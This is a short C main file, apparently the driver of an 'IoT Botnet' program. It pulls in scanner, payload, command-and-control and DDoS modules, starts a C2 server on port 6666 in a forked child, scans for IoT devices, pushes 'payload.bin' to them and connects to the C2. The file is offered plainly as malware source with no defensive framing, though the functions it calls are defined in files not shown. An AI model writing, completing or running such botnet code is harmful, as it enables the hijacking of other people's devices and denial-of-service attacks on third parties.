#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "scanner.c"
#include "payload.c"
#include "c2.c"
#include "ddos.c"
#include "utils.h"

#define C2_PORT 6666

int main() {
    printf("[*] Starting IoT Botnet\n");
    
    if (fork() == 0) {
        start_c2_server(C2_PORT);
    } else {
        scan_iot_devices();
        sleep(10);
        send_payload("payload.bin");
        sleep(5);
        c2_connect("127.0.0.1", C2_PORT);
    }
    
    return 0;
}
